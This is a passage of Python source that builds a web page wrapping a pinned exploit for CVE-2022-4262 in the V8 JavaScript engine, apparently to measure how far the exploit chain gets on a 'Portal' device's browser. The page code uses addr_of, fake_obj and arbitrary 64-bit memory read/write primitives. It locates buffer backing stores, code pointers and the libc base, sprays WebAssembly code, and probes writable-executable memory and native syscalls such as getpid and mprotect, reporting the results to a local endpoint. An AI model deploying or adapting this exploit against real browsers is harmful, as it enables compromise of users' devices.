    webgl2_supported: false,
    webgl2_software_rendering: false,
    webgl2_version: "",
    webgl2_renderer: "",
    webgl2_vendor: "",
    webgl2_unmasked_vendor: "",
    webgl2_unmasked_renderer: "",
    webgl2_discard_framebuffer: false,
    webgl2_max_texture_size: -1,
    webgl2_error: ""
  };
  var cap = function(s) { return typeof s === "string" ? s.slice(0, 255) : ""; };
  try {
    var c1 = document.createElement("canvas");
    var gl1 = c1.getContext("webgl");
    report.webgl1_supported = !!gl1;
    gl1 = null; c1 = null;
  } catch (_e1) {}
  try {
    var c = document.createElement("canvas");
    var gl = c.getContext("webgl2");
    if (gl) {
      report.webgl2_supported = true;
      try { report.webgl2_version = cap(String(gl.getParameter(gl.VERSION))); } catch (_e) { report.webgl2_error += "version:" + _e + ";"; }
      try { report.webgl2_renderer = cap(String(gl.getParameter(gl.RENDERER))); } catch (_e) {}
      try { report.webgl2_vendor = cap(String(gl.getParameter(gl.VENDOR))); } catch (_e) {}
      try {
        var ext = gl.getExtension("WEBGL_debug_renderer_info");
        if (ext) {
          report.webgl2_unmasked_vendor = cap(String(gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)));
          report.webgl2_unmasked_renderer = cap(String(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)));
        }
      } catch (_e) {}
      try { report.webgl2_discard_framebuffer = !!gl.getExtension("EXT_discard_framebuffer"); } catch (_e) {}
      try { report.webgl2_max_texture_size = Number(gl.getParameter(gl.MAX_TEXTURE_SIZE)) | 0; } catch (_e) {}
    }
    gl = null; c = null;
  } catch (_e2) { report.webgl2_error += "ctx:" + _e2 + ";"; }
  try {
    var cs = document.createElement("canvas");
    var gls = cs.getContext("webgl2", {failIfMajorPerformanceCaveat: true});
    report.webgl2_software_rendering = (gls === null);
    gls = null; cs = null;
  } catch (_e3) {}
  document.getElementById("status").textContent = "done";
  fetch("/api/report", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    cache: "no-store",
    credentials: "omit",
    body: JSON.stringify(report)
  }).catch(function() {});
})();
</script></html>
"""
    return page.encode("utf-8")


def build_page(
    original_gc_trigger=False,
    verify_rw_roundtrip=False,
    probe_arraybuffer_pointer_model=False,
    probe_arraybuffer_backing_store_rw=False,
    probe_layout=False,
    native_getpid=False,
    native_execute=True,
    probe_code_writable=False,
    probe_libc_base=False,
    native_getpid_direct=False,
    native_env_probe=False,
    probe_webgl_graph=False,
    probe_webgl_vtable=False,
    probe_webgl_trigger=False,
):
    request = urllib.request.Request(
        SOURCE_URL,
        headers={"User-Agent": "PortalCVE20224262Stage1/1.0"},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        source = response.read(MAX_SOURCE_BYTES + 1)
    if not source or len(source) > MAX_SOURCE_BYTES:
        raise RuntimeError("Pinned source is empty or too large")

    blob_header = b"blob " + str(len(source)).encode("ascii") + b"\0"
    if hashlib.sha1(blob_header + source).hexdigest() != SOURCE_GIT_BLOB_SHA1:
        raise RuntimeError("Pinned CVE source hash mismatch; refusing to serve")

    js = source.decode("utf-8")
    if original_gc_trigger:
        gc_replacement = f"""function gc_major() {{
    if (window.__portal_pressure_allocation_attempts >= {MAX_PRESSURE_ALLOCATION_CALLS}) {{
        throw new RangeError("original allocation attempt cap reached");
    }}
    window.__portal_pressure_allocation_attempts += 1;
    if (window.__portal_pressure_allocation_calls >= 1) {{
        window.__portal_pressure_allocation_failures += 1;
        throw new RangeError("successful original-size allocation cap reached");
    }}
    try {{
        const pressure = new ArrayBuffer(0x7fe00000);
        window.__portal_pressure_allocation_bytes += pressure.byteLength;
        window.__portal_pressure_allocation_calls += 1;
    }} catch (error) {{
        window.__portal_pressure_allocation_failures += 1;
        throw error;
    }}
}}"""
    else:
        gc_replacement = f"""function gc_major() {{
    if (window.__portal_pressure_allocation_attempts >= {MAX_PRESSURE_ALLOCATION_CALLS}) {{
        throw new RangeError("bounded allocation pressure limit reached");
    }}
    window.__portal_pressure_allocation_attempts += 1;
    try {{
        const pressure = new ArrayBuffer({PRESSURE_CHUNK_BYTES});
        const touched = new Uint8Array(pressure);
        touched[0] = 0x42;
        touched[touched.length - 1] = 0x62;
        window.__portal_pressure_allocation_bytes += pressure.byteLength;
        window.__portal_pressure_allocation_calls += 1;
    }} catch (error) {{
        window.__portal_pressure_allocation_failures += 1;
        throw error;
    }}
}}"""
    js, gc_replacements = GC_MAJOR_RE.subn(gc_replacement, js)
    if gc_replacements != 1:
        raise RuntimeError("Unexpected pinned GC trigger; refusing to serve")

    js, debug_calls = DEBUG_INTRINSIC_RE.subn(r"void (\1);", js)
    js, _commented_debug_calls = COMMENTED_DEBUG_INTRINSIC_RE.subn("", js)
    if debug_calls < 1 or re.search(r"^\s*%(?:GlobalPrint|DebugPrint)\(", js, re.MULTILINE):
        raise RuntimeError("Could not remove all d8-only debug calls")
    if not original_gc_trigger and "new ArrayBuffer(0x7fe00000)" in js:
        raise RuntimeError("Unbounded allocation remains in transformed source")
    if "</script" in js.lower():
        raise RuntimeError("Unexpected script terminator in pinned source")

    js, marker_replacements = re.subn(
        r"corrupted_obj\.p18 = 0x30;",
        """corrupted_obj.p18 = 0x30;
    window.__portal_probe_array_length = arr1.length;
    window.__portal_trigger_observed = window.__portal_probe_array_length === 0x30;
    if (!window.__portal_trigger_observed) {
        window.portal_report("trigger_not_observed", false, false, false, false,
            window.__portal_trigger_observed, window.__portal_probe_array_length);
        throw new Error("bounded probe stopped: trigger not observed");
    }""",
        js,
        count=1,
    )
    if marker_replacements != 1:
        raise RuntimeError("Could not add the bounded trigger success marker")

    if verify_rw_roundtrip:
        js, rw_replacements = re.subn(
            r"v8_write64\(corrupted_obj_addr,\s*small_obj_map_and_props\);"
            r"[ \t]*//restore the corrupted MAP",
            """v8_write64(corrupted_obj_addr, small_obj_map_and_props); //restore the corrupted MAP
window.__portal_rw_roundtrip_attempted = true;
window.__portal_rw_roundtrip_match =
  v8_read64(corrupted_obj_addr) === small_obj_map_and_props;""",
            js,
            count=1,
        )
        if rw_replacements != 1:
            raise RuntimeError("Could not add the bounded map readback check")

    page_script = """<!doctype html>
<html lang="en"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Portal renderer candidate</title>
<p id="status">Running one bounded renderer candidate...</p>
<script>
window.__portal_pressure_allocation_bytes = 0;
window.__portal_pressure_allocation_calls = 0;
window.__portal_pressure_allocation_attempts = 0;
window.__portal_pressure_allocation_failures = 0;
window.__portal_trigger_observed = false;
window.__portal_probe_array_length = null;
window.__portal_source_complete = false;
window.__portal_heap_used_start_bytes = null;
window.__portal_diag_address_nonzero = false;
window.__portal_diag_recovered_object = false;
window.__portal_diag_same_object = false;
window.__portal_rw_roundtrip_attempted = false;
window.__portal_rw_roundtrip_match = false;
window.__portal_pointer_model_probe_requested = false;
window.__portal_pointer_model_probe_attempted = false;
window.__portal_pointer_model_layout_32 = false;
window.__portal_pointer_model_layout_64 = false;
window.__portal_pointer_model_backing_store_nonzero = false;
window.__portal_pointer_model_upper32_nonzero = false;
window.__portal_pointer_model_hint = "not_run";
window.__portal_backing_store_rw_probe_requested = false;
window.__portal_backing_store_rw_probe_attempted = false;
window.__portal_backing_store_rw_read_match = false;
window.__portal_backing_store_rw_write_match = false;
window.__portal_backing_store_rw_restore_match = false;
window.__portal_layout_probe_requested = false;
window.__portal_layout_probe_attempted = false;
window.__portal_jsfunc_code_pointer_valid = false;
window.__portal_jsfunc_code_map_pointer_valid = false;
window.__portal_jsfunc_code_region_far = false;
window.__portal_wasm_code_pointer_valid = false;
window.__portal_wasm_code_map_pointer_valid = false;
window.__portal_wasm_code_region_far = false;
window.__portal_native_getpid_requested = false;
window.__portal_native_execute_requested = false;
window.__portal_native_spray_ready = false;
window.__portal_native_code_pointer_valid = false;
window.__portal_native_wasm_target_valid = false;
window.__portal_native_any_word_found = false;
window.__portal_native_probe_attempted = false;
window.__portal_native_spray_landed = false;
window.__portal_native_spray_offset = 0;
window.__portal_native_spray_word_hits = 0;
window.__portal_native_jump_attempted = false;
window.__portal_native_jump_result_is_number = false;
window.__portal_native_jump_result = 0;
window.__portal_native_getpid_direct_requested = false;
window.__portal_native_direct_attempted = false;
window.__portal_native_direct_getpid_valid = false;
window.__portal_native_direct_call_target_valid = false;
window.__portal_native_direct_result_is_number = false;
window.__portal_native_direct_result = 0;
window.__portal_native_env_probe_requested = false;
window.__portal_env_probe_attempted = false;
window.__portal_env_probe_getuid_valid = false;
window.__portal_env_probe_open_valid = false;
window.__portal_env_probe_read_valid = false;
window.__portal_env_probe_close_valid = false;
window.__portal_env_probe_call_target_valid = false;
window.__portal_env_probe_getuid_result = -1;
window.__portal_env_probe_open_fd = -1;
window.__portal_env_probe_read_count = -1;
window.__portal_env_probe_close_result = -1;
window.__portal_env_probe_version = "";
window.__portal_env_probe_uname_valid = false;
window.__portal_env_probe_uname_result = -1;
window.__portal_env_probe_open_errno = -1;
window.__portal_env_probe_getuid_arg_result = -1;
window.__portal_env_probe_abs_result = -1;
window.__portal_env_probe_backing_rt_kind = 0;
window.__portal_env_probe_backing_rt_match = false;
window.__portal_env_probe_backing_signed = false;
window.__portal_webgl_graph_probe_requested = false;
window.__portal_webgl_graph_attempted = false;
window.__portal_webgl_ctx_created = false;
window.__portal_webgl_native_resolved = false;
window.__portal_webgl_native_candidates = 0;
window.__portal_webgl_db_valid = false;
window.__portal_webgl_db_offset = -1;
window.__portal_webgl_gl_valid = false;
window.__portal_webgl_prov_valid = false;
window.__portal_webgl_gl_prov_distinct = false;
window.__portal_webgl_vtable_probe_requested = false;
window.__portal_webgl_vtable_attempted = false;
window.__portal_webgl_vtable_entry_valid = false;
window.__portal_webgl_vtable_result_is_number = false;
window.__portal_webgl_vtable_match = false;
window.__portal_webgl_trigger_probe_requested = false;
window.__portal_webgl_trigger_attempted = false;
window.__portal_webgl_trigger_buffer_resolved = false;
window.__portal_webgl_trigger_memstart_valid = false;
window.__portal_webgl_trigger_sii_resolved = false;
window.__portal_webgl_trigger_calls_completed = 0;
window.__portal_webgl_trigger_texture_id = -1;
window.__portal_webgl_trigger_discard_done = false;
window.__portal_webgl_trigger_tramp_found = false;
window.__portal_webgl_trigger_tramp_word_hits = 0;
window.__portal_webgl_trigger_spray_offset = 0;
window.__portal_webgl_trigger_targets_ptr_valid = false;
window.__portal_webgl_trigger_target0_match = false;
window.__portal_ci_getpid_result = -1;
window.__portal_ci_abs_result = -1;
window.__portal_ci_mprotect_result = -1;
window.__portal_ci_errno_resolved = false;
window.__portal_ci_mmap_rw_errno = -1;
window.__portal_ci_mmap_rw_ret_fail = false;
window.__portal_ci_mmap_rwx_ret_fail = false;
window.__portal_ci_errno_ret_class = 0;
window.__portal_ci_i64_valid = false;
window.__portal_ci_ref_slot_valid = false;
window.__portal_ci_ref_overwrite_ok = false;
window.__portal_ci_ref_slot_offset = 0;
window.__portal_ci_mmap_big_ret_fail = false;
window.__portal_ci_mmap_big_errno = -1;
window.__portal_ci_syscall_getpid_result = -1;
window.__portal_ci_syscall_getpid_valid = false;
window.__portal_ci_mmap_rwx_class = 0;
window.__portal_webgl_trigger_tramp_code_valid = false;
window.__portal_webgl_trigger_tramp_direct_write = false;
window.__portal_webgl_trigger_printf_valid = false;
window.__portal_webgl_trigger_mprotect_ok = false;
window.__portal_webgl_trigger_mprotect_result = -1;
window.__portal_webgl_trigger_mprotect_errno = -1;
window.__portal_webgl_trigger_mmap_ok = false;
window.__portal_webgl_trigger_mmap_errno = -1;
window.__portal_wasm_direct_result = -1;
window.__portal_wasm_import_result = -1;
window.__portal_webgl_trigger_tramp_written = false;
window.__portal_native_spray_accum = 0;
window.__portal_code_writable_probe_requested = false;
window.__portal_code_writable_probe_attempted = false;
window.__portal_code_writable = false;
window.__portal_libc_base_probe_requested = false;
window.__portal_libc_base_probe_attempted = false;
window.__portal_isolate_root_valid = false;
window.__portal_libc_graph_depth = 0;
window.__portal_libc_builtin_run_len = 0;
window.__portal_libc_builtin_run_offset = 0;
window.__portal_libc_raw_field_bits = 0;
window.__portal_libc_elf_magic_found = false;
window.__portal_libc_elf_pages_back = 0;
window.__portal_libc_second_run_len = 0;
window.__portal_libc_second_run_offset = 0;
window.__portal_libc_extref_init_off = 0;
window.__portal_libc_extref_table_off = 0;
window.__portal_libc_printf_thumb = false;
window.__portal_libc_printf_valid = false;
window.__portal_report_sent = false;
try {
  const memory = performance && performance.memory;
  if (memory && Number.isFinite(memory.usedJSHeapSize)) {
    window.__portal_heap_used_start_bytes = Math.floor(memory.usedJSHeapSize);
  }
} catch (_error) {}
window.portal_report = function(status, primitive, addressNonzero, recoveredObject,
    sameObject, triggerObserved, arrayLength) {
  if (window.__portal_report_sent) return;
  window.__portal_report_sent = true;
  document.getElementById("status").textContent = status;
  let heapUsed = null;
  let heapLimit = null;
  try {
    const memory = performance && performance.memory;
    if (memory && Number.isFinite(memory.usedJSHeapSize)) {
      heapUsed = Math.floor(memory.usedJSHeapSize);
    }
    if (memory && Number.isFinite(memory.jsHeapSizeLimit)) {
      heapLimit = Math.floor(memory.jsHeapSizeLimit);
    }
  } catch (_error) {}
  const body = JSON.stringify({
    status,
    primitive,
    address_nonzero: addressNonzero,
    recovered_object: recoveredObject,
    same_object: sameObject,
    trigger_observed: triggerObserved,
    array_length: arrayLength,
    rw_roundtrip_attempted: window.__portal_rw_roundtrip_attempted,
    rw_roundtrip_match: window.__portal_rw_roundtrip_match,
    pointer_model_probe_attempted: window.__portal_pointer_model_probe_attempted,
    arraybuffer_layout_32: window.__portal_pointer_model_layout_32,
    arraybuffer_layout_64: window.__portal_pointer_model_layout_64,
    backing_store_nonzero: window.__portal_pointer_model_backing_store_nonzero,
    backing_store_upper32_nonzero: window.__portal_pointer_model_upper32_nonzero,
    pointer_model_hint: window.__portal_pointer_model_hint,
    backing_store_rw_probe_attempted: window.__portal_backing_store_rw_probe_attempted,
    backing_store_rw_read_match: window.__portal_backing_store_rw_read_match,
    backing_store_rw_write_match: window.__portal_backing_store_rw_write_match,
    backing_store_rw_restore_match: window.__portal_backing_store_rw_restore_match,
    layout_probe_attempted: window.__portal_layout_probe_attempted,
    jsfunc_code_pointer_valid: window.__portal_jsfunc_code_pointer_valid,
    jsfunc_code_map_pointer_valid: window.__portal_jsfunc_code_map_pointer_valid,
    jsfunc_code_region_far: window.__portal_jsfunc_code_region_far,
    wasm_code_pointer_valid: window.__portal_wasm_code_pointer_valid,
    wasm_code_map_pointer_valid: window.__portal_wasm_code_map_pointer_valid,
    wasm_code_region_far: window.__portal_wasm_code_region_far,
    native_spray_ready: window.__portal_native_spray_ready,
    native_code_pointer_valid: window.__portal_native_code_pointer_valid,
    native_wasm_target_valid: window.__portal_native_wasm_target_valid,
    native_any_word_found: window.__portal_native_any_word_found,
    native_probe_attempted: window.__portal_native_probe_attempted,
    native_spray_landed: window.__portal_native_spray_landed,
    native_spray_offset: window.__portal_native_spray_offset,
    native_spray_word_hits: window.__portal_native_spray_word_hits,
    native_jump_attempted: window.__portal_native_jump_attempted,
    native_jump_result_is_number: window.__portal_native_jump_result_is_number,
    native_jump_result: window.__portal_native_jump_result,
    native_direct_attempted: window.__portal_native_direct_attempted,
    native_direct_getpid_valid: window.__portal_native_direct_getpid_valid,
    native_direct_call_target_valid: window.__portal_native_direct_call_target_valid,
    native_direct_result_is_number: window.__portal_native_direct_result_is_number,
    native_direct_result: window.__portal_native_direct_result,
    code_writable_probe_attempted: window.__portal_code_writable_probe_attempted,
    code_writable: window.__portal_code_writable,
    libc_base_probe_attempted: window.__portal_libc_base_probe_attempted,
    isolate_root_valid: window.__portal_isolate_root_valid,
    libc_graph_depth: window.__portal_libc_graph_depth,
    libc_builtin_run_len: window.__portal_libc_builtin_run_len,
    libc_builtin_run_offset: window.__portal_libc_builtin_run_offset,
    libc_raw_field_bits: window.__portal_libc_raw_field_bits,
    libc_elf_magic_found: window.__portal_libc_elf_magic_found,
    libc_elf_pages_back: window.__portal_libc_elf_pages_back,
    libc_second_run_len: window.__portal_libc_second_run_len,
    libc_second_run_offset: window.__portal_libc_second_run_offset,
    libc_extref_init_off: window.__portal_libc_extref_init_off,
    libc_extref_table_off: window.__portal_libc_extref_table_off,
    libc_extref_printf_thumb: window.__portal_libc_printf_thumb,
    libc_extref_printf_valid: window.__portal_libc_printf_valid,
    env_probe_attempted: window.__portal_env_probe_attempted,
    env_probe_getuid_valid: window.__portal_env_probe_getuid_valid,
    env_probe_open_valid: window.__portal_env_probe_open_valid,
    env_probe_read_valid: window.__portal_env_probe_read_valid,
    env_probe_close_valid: window.__portal_env_probe_close_valid,
    env_probe_call_target_valid: window.__portal_env_probe_call_target_valid,
    env_probe_getuid_result: window.__portal_env_probe_getuid_result,
    env_probe_open_fd: window.__portal_env_probe_open_fd,
    env_probe_read_count: window.__portal_env_probe_read_count,
    env_probe_close_result: window.__portal_env_probe_close_result,
    env_probe_version: window.__portal_env_probe_version,
    env_probe_uname_valid: window.__portal_env_probe_uname_valid,
    env_probe_uname_result: window.__portal_env_probe_uname_result,
    env_probe_open_errno: window.__portal_env_probe_open_errno,
    env_probe_getuid_arg_result: window.__portal_env_probe_getuid_arg_result,
    env_probe_abs_result: window.__portal_env_probe_abs_result,
    env_probe_backing_rt_kind: window.__portal_env_probe_backing_rt_kind,
    env_probe_backing_rt_match: window.__portal_env_probe_backing_rt_match,
    env_probe_backing_signed: window.__portal_env_probe_backing_signed,
    webgl_graph_attempted: window.__portal_webgl_graph_attempted,
    webgl_ctx_created: window.__portal_webgl_ctx_created,
    webgl_native_resolved: window.__portal_webgl_native_resolved,
    webgl_native_candidates: window.__portal_webgl_native_candidates,
    webgl_db_valid: window.__portal_webgl_db_valid,
    webgl_db_offset: window.__portal_webgl_db_offset,
    webgl_gl_valid: window.__portal_webgl_gl_valid,
    webgl_prov_valid: window.__portal_webgl_prov_valid,
    webgl_gl_prov_distinct: window.__portal_webgl_gl_prov_distinct,
    webgl_vtable_attempted: window.__portal_webgl_vtable_attempted,
    webgl_vtable_entry_valid: window.__portal_webgl_vtable_entry_valid,
    webgl_vtable_result_is_number: window.__portal_webgl_vtable_result_is_number,
    webgl_vtable_match: window.__portal_webgl_vtable_match,
    webgl_trigger_attempted: window.__portal_webgl_trigger_attempted,
    webgl_trigger_buffer_resolved: window.__portal_webgl_trigger_buffer_resolved,
    webgl_trigger_memstart_valid: window.__portal_webgl_trigger_memstart_valid,
    webgl_trigger_sii_resolved: window.__portal_webgl_trigger_sii_resolved,
    webgl_trigger_calls_completed: window.__portal_webgl_trigger_calls_completed,
    webgl_trigger_texture_id: window.__portal_webgl_trigger_texture_id,
    webgl_trigger_discard_done: window.__portal_webgl_trigger_discard_done,
    webgl_trigger_tramp_found: window.__portal_webgl_trigger_tramp_found,
    webgl_trigger_tramp_word_hits: window.__portal_webgl_trigger_tramp_word_hits,
    webgl_trigger_spray_offset: window.__portal_webgl_trigger_spray_offset,
    webgl_trigger_targets_ptr_valid: window.__portal_webgl_trigger_targets_ptr_valid,
    webgl_trigger_target0_match: window.__portal_webgl_trigger_target0_match,
    ci_getpid_result: window.__portal_ci_getpid_result,
    ci_abs_result: window.__portal_ci_abs_result,
    ci_mprotect_result: window.__portal_ci_mprotect_result,
    ci_mmap_rw_ok: window.__portal_ci_mmap_rw_ok,
    ci_errno_resolved: window.__portal_ci_errno_resolved,
    ci_mmap_rw_errno: window.__portal_ci_mmap_rw_errno,
    ci_mmap_rw_ret_fail: window.__portal_ci_mmap_rw_ret_fail,
    ci_mmap_rwx_ret_fail: window.__portal_ci_mmap_rwx_ret_fail,
    ci_errno_ret_class: window.__portal_ci_errno_ret_class,
    ci_i64_valid: window.__portal_ci_i64_valid,
    ci_ref_slot_valid: window.__portal_ci_ref_slot_valid,
    ci_ref_overwrite_ok: window.__portal_ci_ref_overwrite_ok,
    ci_ref_slot_offset: window.__portal_ci_ref_slot_offset,
    ci_mmap_big_ret_fail: window.__portal_ci_mmap_big_ret_fail,
    ci_mmap_big_errno: window.__portal_ci_mmap_big_errno,
    ci_syscall_getpid_result: window.__portal_ci_syscall_getpid_result,
    ci_syscall_getpid_valid: window.__portal_ci_syscall_getpid_valid,
    ci_mmap_rwx_class: window.__portal_ci_mmap_rwx_class,
    webgl_trigger_tramp_code_valid: window.__portal_webgl_trigger_tramp_code_valid,
    webgl_trigger_tramp_direct_write: window.__portal_webgl_trigger_tramp_direct_write,
    webgl_trigger_printf_valid: window.__portal_webgl_trigger_printf_valid,
    webgl_trigger_mprotect_ok: window.__portal_webgl_trigger_mprotect_ok,
    webgl_trigger_mprotect_result: window.__portal_webgl_trigger_mprotect_result,
    webgl_trigger_mprotect_errno: window.__portal_webgl_trigger_mprotect_errno,
    webgl_trigger_mmap_ok: window.__portal_webgl_trigger_mmap_ok,
    webgl_trigger_mmap_errno: window.__portal_webgl_trigger_mmap_errno,
    wasm_direct_result: window.__portal_wasm_direct_result,
    wasm_import_result: window.__portal_wasm_import_result,
    webgl_trigger_tramp_written: window.__portal_webgl_trigger_tramp_written,
    pressure_allocation_bytes: window.__portal_pressure_allocation_bytes,
    pressure_allocation_calls: window.__portal_pressure_allocation_calls,
    pressure_allocation_attempts: window.__portal_pressure_allocation_attempts,
    pressure_allocation_failures: window.__portal_pressure_allocation_failures,
    heap_used_start_bytes: window.__portal_heap_used_start_bytes,
    heap_used_bytes: heapUsed,
    heap_limit_bytes: heapLimit
  });
  fetch("/api/report", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    cache: "no-store",
    credentials: "omit",
    body
  }).catch(function() {});
  // RWX-race gate #3: after a 500 ms event-loop yield (idle GC + any pending
  // async TurboFan tier-up), re-verify the R/W primitives still round-trip on a
  // fresh low buffer. If they survive, the code-space write window is reachable.
  if (window.__portal_webgl_trigger_probe_requested &&
      !window.__portal_gc_survival_scheduled) {
    window.__portal_gc_survival_scheduled = true;
    setTimeout(function () {
      var ok = false;
      try {
        var gb = new ArrayBuffer(0x100);
        var gba = addr_of(gb);
        var glen = BigInt(gb.byteLength);
        var gback = 0n;
        for (var goff = 0n; goff <= 0x48n; goff += 4n) {
          var gw = v8_read64(gba + goff);
          if ((gw & 0xffffffffn) === glen && ((gw >> 32n) & 0xffffffffn) === glen) {
            var gbe = v8_read64(gba + goff + 8n);
            if ((gbe & 0xffffffffn) !== 0n) { gback = gbe & 0xffffffffn; break; }
          }
        }
        if (gback !== 0n) {
          var gorig = v8_read64(gback);
          var gmark = 0x12345678abcdef01n;
          v8_write64(gback, gmark);
          ok = (v8_read64(gback) === gmark);
          v8_write64(gback, gorig);
        }
      } catch (_gcErr) { ok = false; }
      try {
        var sx = new XMLHttpRequest();
        sx.open("POST", "/api/stage", false);
        sx.setRequestHeader("Content-Type", "application/json");
        sx.send(JSON.stringify({ stage: "gc_survival=" + (ok ? "1" : "0") }));
      } catch (_sxErr) {}
    }, 500);
  }
};
window.addEventListener("error", function(event) {
  if (!window.__portal_report_sent) {
    window.portal_report("exception", false,
      window.__portal_diag_address_nonzero,
      window.__portal_diag_recovered_object,
      window.__portal_diag_same_object,
      window.__portal_trigger_observed,
      window.__portal_probe_array_length);
  }
  event.preventDefault();
});
window.native_stage = function (stage) {
  try {
    fetch("/api/stage", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      cache: "no-store",
      credentials: "omit",
      body: JSON.stringify({stage: stage})
    }).catch(function () {});
  } catch (_stageError) {}
};
if (window.__portal_native_getpid_requested || window.__portal_code_writable_probe_requested || window.__portal_libc_base_probe_requested) {
  try {
    window.__portal_native_spray_bytes = new Uint8Array(__WASM_SPRAY_BYTES__);
    window.__portal_native_i32_bytes = new Uint8Array(__WASM_I32_MODULE_BYTES__);
    window.__portal_native_spray_module = new WebAssembly.Module(window.__portal_native_spray_bytes);
    window.__portal_native_spray_instance = new WebAssembly.Instance(window.__portal_native_spray_module);
    window.portal_native_spray_fn = window.__portal_native_spray_instance.exports.f;
    var nativeSprayAccum = 0;
    for (var si = 0; si < 0x100; si += 1) {
      nativeSprayAccum += window.portal_native_spray_fn();
    }
    window.__portal_native_spray_accum = nativeSprayAccum;
    window.__portal_native_spray_ready = true;
    window.native_stage("spray_done");
  } catch (_nativeSprayPrepError) {
    window.__portal_native_spray_ready = false;
    window.native_stage("spray_failed");
  }
}
if (window.__portal_webgl_trigger_probe_requested) {
  try {
    window.__portal_tramp_module = new WebAssembly.Module(new Uint8Array(__WASM_TRAMP_MODULE_BYTES__));
    window.__portal_tramp_instance = new WebAssembly.Instance(window.__portal_tramp_module);
    window.portal_tramp_fn = window.__portal_tramp_instance.exports.f;
    var trampAccum = 0;
    for (var tti = 0; tti < 0x1000; tti += 1) {
      trampAccum += window.portal_tramp_fn(0.0);
    }
    window.__portal_tramp_accum = trampAccum;
    window.native_stage("tramp_prep");
  } catch (_trampPrepError) {
    window.native_stage("tramp_prep_failed");
  }
}
</script>
<script>
""" + js + """
window.__portal_source_complete = true;
</script>
<script>
if (window.__portal_source_complete && window.__portal_trigger_observed) {
    const portal_probe_object = {portal_marker: 0x4262};
    const portal_probe_address = addr_of(portal_probe_object);
    window.__portal_diag_address_nonzero = portal_probe_address > 0n;
    const portal_probe_recovered = fake_obj(portal_probe_address);
    window.__portal_diag_recovered_object = portal_probe_recovered !== null &&
      (typeof portal_probe_recovered === "object" ||
        typeof portal_probe_recovered === "function");
    window.__portal_diag_same_object = portal_probe_recovered === portal_probe_object;
    if (window.__portal_pointer_model_probe_requested &&
        window.__portal_rw_roundtrip_attempted &&
        window.__portal_rw_roundtrip_match) {
      window.__portal_pointer_model_probe_attempted = true;
      window.__portal_pointer_model_hint = "unresolved";
      const probeBuffer = new ArrayBuffer(0x2000);
      const probeBytes = new Uint8Array(probeBuffer);
      probeBytes[0] = 0x42;
      probeBytes[probeBytes.length - 1] = 0x62;
      const probeView = new DataView(probeBuffer);
      const originalMarker = 0x1122334455667788n;
      const changedMarker = 0x2233445566778899n;
      probeView.setBigUint64(0, originalMarker, true);
      const bufferAddress = addr_of(probeBuffer);
      const expectedLength = BigInt(probeBuffer.byteLength);
      let backingStoreAddress32 = 0n;
      for (let offset = 0n; offset <= 0x48n; offset += 4n) {
        const word = v8_read64(bufferAddress + offset);
        if (word === expectedLength &&
            v8_read64(bufferAddress + offset + 8n) === expectedLength) {
          const backingStore = v8_read64(bufferAddress + offset + 16n);
          if (backingStore !== 0n) {
            window.__portal_pointer_model_layout_64 = true;
            window.__portal_pointer_model_backing_store_nonzero = true;
            window.__portal_pointer_model_upper32_nonzero =
              ((backingStore >> 32n) & 0xffffffffn) !== 0n;
          }
        }
        if ((word & 0xffffffffn) === expectedLength &&
            ((word >> 32n) & 0xffffffffn) === expectedLength) {
          const backingAndExtension = v8_read64(bufferAddress + offset + 8n);
          if ((backingAndExtension & 0xffffffffn) !== 0n) {
            window.__portal_pointer_model_layout_32 = true;
            window.__portal_pointer_model_backing_store_nonzero = true;
            backingStoreAddress32 = backingAndExtension & 0xffffffffn;
          }
        }
      }
      if (window.__portal_pointer_model_layout_32 &&
          window.__portal_pointer_model_layout_64) {
        window.__portal_pointer_model_hint = "ambiguous";
      } else if (window.__portal_pointer_model_layout_32) {
        window.__portal_pointer_model_hint = "32-bit-layout";
      } else if (window.__portal_pointer_model_layout_64) {
        window.__portal_pointer_model_hint = "64-bit-layout";
      } else {
        window.__portal_pointer_model_hint = "unresolved";
      }
      if (window.__portal_backing_store_rw_probe_requested &&
          window.__portal_pointer_model_hint === "32-bit-layout" &&
          backingStoreAddress32 !== 0n &&
          (backingStoreAddress32 & 7n) === 0n) {
        window.__portal_backing_store_rw_probe_attempted = true;
        try {
          const observedMarker = v8_read64(backingStoreAddress32);
          window.__portal_backing_store_rw_read_match =
            observedMarker === originalMarker;
          if (window.__portal_backing_store_rw_read_match) {
            try {
              v8_write64(backingStoreAddress32, changedMarker);
              window.__portal_backing_store_rw_write_match =
                v8_read64(backingStoreAddress32) === changedMarker &&
                probeView.getBigUint64(0, true) === changedMarker;
            } finally {
              v8_write64(backingStoreAddress32, originalMarker);
              window.__portal_backing_store_rw_restore_match =
                v8_read64(backingStoreAddress32) === originalMarker &&
                probeView.getBigUint64(0, true) === originalMarker;
            }
          }
        } catch (_backingStoreProbeError) {}
      }
    }
    if (window.__portal_layout_probe_requested &&
        window.__portal_rw_roundtrip_attempted &&
        window.__portal_rw_roundtrip_match &&
        window.__portal_pointer_model_hint === "32-bit-layout") {
      window.__portal_layout_probe_attempted = true;
      const FUNC_CODE_FIELD_OFFSET = 0x18n;
      const REGION_FAR_THRESHOLD = 0x1000000n;
      const layoutReadTagged = function (address) {
        return v8_read64(address) & 0xffffffffn;
      };
      const layoutIsPointer = function (tagged) {
        return (tagged & 1n) === 1n && tagged > 0x1000n;
      };
      const layoutProbeCodeField = function (obj) {
        const objAddress = addr_of(obj);
        const codeTagged = layoutReadTagged(objAddress + FUNC_CODE_FIELD_OFFSET);
        const pointerValid = layoutIsPointer(codeTagged);
        let mapPointerValid = false;
        let regionFar = false;
        if (pointerValid) {
          const codeAddress = codeTagged - 1n;
          const delta = codeAddress > objAddress
            ? codeAddress - objAddress
            : objAddress - codeAddress;
          regionFar = delta >= REGION_FAR_THRESHOLD;
          try {
            mapPointerValid = layoutIsPointer(layoutReadTagged(codeAddress));
          } catch (_layoutMapProbeError) {}
        }
        return {
          pointerValid: pointerValid,
          mapPointerValid: mapPointerValid,
          regionFar: regionFar
        };
      };
      const layoutPlainFunc = function portal_layout_plain_target() {};
      const layoutPlainResult = layoutProbeCodeField(layoutPlainFunc);
      window.__portal_jsfunc_code_pointer_valid = layoutPlainResult.pointerValid;
      window.__portal_jsfunc_code_map_pointer_valid = layoutPlainResult.mapPointerValid;
      window.__portal_jsfunc_code_region_far = layoutPlainResult.regionFar;
      try {
